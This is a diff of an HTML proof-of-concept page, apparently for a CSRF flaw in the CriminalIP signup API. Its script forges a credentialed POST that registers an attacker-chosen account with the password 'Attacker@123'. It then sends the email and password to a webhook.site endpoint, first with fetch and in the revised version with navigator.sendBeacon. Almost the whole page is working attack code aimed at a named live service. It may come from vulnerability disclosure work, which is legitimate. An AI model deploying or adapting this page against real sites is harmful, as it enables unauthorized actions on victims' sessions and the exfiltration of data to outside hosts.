@@ -1,41 +1,43 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CriminalIP CSRF PoC</title>
-</head>
-<body>
-  <h1>CSRF Exploit - With Working Webhook Logging</h1>
-  <script>
-    const victimEmail = "csrfvictim" + Math.floor(Math.random() * 100000) + "@evil.com";
-    const password = "Attacker@123";
+  <head>
+    <title>CriminalIP CSRF PoC</title>
+  </head>
+  <body>
+    <h1>CSRF PoC + Webhook Exfiltration</h1>
+    <script>
+      const email = "csrfvictim" + Math.floor(Math.random() * 100000) + "@evil.com";
+      const password = "Attacker@123";
 
-    // Step 1: Exploit the signup CSRF
-    fetch("https://www.criminalip.io/api/auth/user/signup", {
-      method: "POST",
-      credentials: "include",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        account_type: "not_social",
-        email: victimEmail,
-        uid: "",
-        name: "CSRF Victim",
-        pw: password,
-        pp_agree_code: "1",
-        tos_agree_code: "1",
-        ad_agree_code: "1"
-      })
-    });
+      // Step 1: Trigger CSRF on CriminalIP signup endpoint
+      fetch("https://www.criminalip.io/api/auth/user/signup", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          account_type: "not_social",
+          email: email,
+          uid: "",
+          name: "CSRF Victim",
+          pw: password,
+          pp_agree_code: "1",
+          tos_agree_code: "1",
+          ad_agree_code: "1"
+        })
+      });
 
-    // Step 2: Exfiltrate victim email/pass to webhook
-    fetch("https://webhook.site/61001786-599b-402b-bcc7-4fbd4fc63a88", {
-      method: "POST",
-      headers: {
-        "Content-Type": "text/plain"
-      },
-      body: `email=${victimEmail}&password=${password}&note=csrf-poc`
-    });
-  </script>
-</body>
+      // Step 2: Exfiltrate to webhook.site using text/plain
+      navigator.sendBeacon(
+        "https://webhook.site/61001786-599b-402b-bcc7-4fbd4fc63a88",
+        new Blob(
+          [
+            `email=${email}\npassword=${password}\nnote=csrf poc from github.io`
+          ],
+          { type: "text/plain" }
+        )
+      );
+    </script>
+  </body>
 </html>
